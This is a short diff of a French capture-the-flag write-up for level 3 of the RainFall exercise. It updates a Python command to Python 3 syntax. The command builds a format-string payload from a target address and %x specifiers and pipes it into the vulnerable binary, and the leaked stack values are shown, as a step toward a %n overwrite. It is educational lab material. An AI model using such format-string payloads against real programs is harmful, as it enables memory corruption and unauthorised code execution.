@@ -33,7 +33,7 @@ Pour atteindre la fonction system on doit passé une verification.
 
 On tatonne jusqu'a trouver le bon offset a passer a %n pour la modification
 ```bash
-level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08 %x %x %x %x'"> /tmp/exploit3
+level3@RainFall:~$ python -c "print('\x8c\x98\x04\x08 %x %x %x %x')" > /tmp/exploit3
 level3@RainFall:~$ cat /tmp/exploit3 | ./level3
 � 200 b7fd1ac0 b7ff37d0 804988c
 ```
